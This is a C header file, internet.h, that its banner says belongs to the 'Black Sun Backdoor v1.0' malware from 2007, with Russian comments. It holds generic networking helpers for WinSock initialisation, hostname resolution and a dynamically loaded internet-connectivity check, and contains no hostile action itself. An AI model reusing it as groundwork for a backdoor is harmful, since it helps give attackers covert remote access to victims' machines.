/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                         (x) Cytecђ 2007
 *
 *  ---------------------------------------------------------------------
 *  [internet.h]
 *      Модуль состоящий из функций для работы с сетью.
 *  ---------------------------------------------------------------------
 */

// ------------------ [ Иницициализация WinSock2 API ] ------------------ //

static DWORD WINAPI InitWinSock2API() 
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2),&wsaData); 
    return 0; 
}

// ------------------ [ Получение IP-адреса по имени хоста ] ------------------ //

static DWORD WINAPI GetIpByHostname(char *host)
{
    DWORD ret = 0;
    struct hostent * hp = gethostbyname(host);
    if (!hp) ret = inet_addr(host);
    if ((!hp)&&(ret == INADDR_NONE)) return 0;
    if (hp != NULL) fMemCpy((void*)&ret, hp->h_addr,hp->h_length);
    return ret;
}

// ------------------ [ Проверка соединения с интернетом ] ------------------ //

static BOOL CheckInternetConnection()
{
	DWORD lpdwFlags;
    BOOL Connect;
    HINSTANCE hLib = NULL;
    INETCHECKPROC pfnInternetGetConnectedState;
    hLib = LoadLibrary("wininet.dll");
    if (!hLib){ return 0; } 
    pfnInternetGetConnectedState = (INETCHECKPROC)GetProcAddress(hLib, "InternetGetConnectedState");
    if(!pfnInternetGetConnectedState) return FALSE; 
    Connect = pfnInternetGetConnectedState(&lpdwFlags, 0) != 0;
    FreeLibrary(hLib); 
    return Connect; 
}
